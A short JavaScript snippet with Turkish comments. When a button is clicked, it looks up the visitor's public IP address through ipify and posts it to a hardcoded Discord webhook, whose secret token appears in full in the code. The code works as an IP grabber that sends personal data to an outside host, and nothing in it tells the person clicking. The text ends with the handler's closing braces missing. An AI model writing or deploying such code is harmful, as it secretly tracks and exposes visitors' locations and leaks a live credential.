document.getElementById("webhookButton").addEventListener("click", function() {
    // Kullanıcının IP adresini almak için bir istek gönderiyoruz
    fetch('https://api64.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        // IP adresini aldıktan sonra, Discord Webhook'a mesajı gönderiyoruz
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/1241350305556467724/oiVjV5bPrlJ-USavpcrBGcmgw1hk-zcVVvXcwh8uIRcKB9UQ1kEWr1Wr05FRVpTLMQBj", true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        // Kullanıcının IP adresiyle birlikte mesajı gönderiyoruz
        var message = "IP Adresi: " + data.ip + "\nKullanıcı bu IP adresinden butona bastı!";
        xhr.send(JSON.stringify({content: message}));
    })
    .catch(error => console.error('IP adresi alınırken bir hata oluştu:', error));